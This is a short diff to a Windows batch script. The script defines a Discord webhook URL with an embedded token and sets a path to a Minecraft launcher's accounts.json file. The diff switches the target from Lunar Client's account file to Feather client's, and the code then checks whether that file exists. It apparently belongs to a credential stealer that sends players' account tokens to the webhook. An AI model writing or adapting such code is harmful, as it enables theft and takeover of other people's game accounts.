@@ -11,7 +11,8 @@ setlocal enabledelayedexpansion
 set webhookUrl=https://discord.com/api/webhooks/1358322214012850186/6CudWFZNnkk25HhvN3uObmfP6_LFBdPD6lzimwkZNkyERaxXeVXq1Pi4UcYfQ_BSVwUr
 
 :: Path to the accounts.json file
-set filePath=%USERPROFILE%\.lunarclient\settings\game\accounts.json
+set filePath=%USERPROFILE%\AppData\Roaming\.feather\accounts.json
+
 
 :: Check if the file exists
 if not exist "%filePath%" (
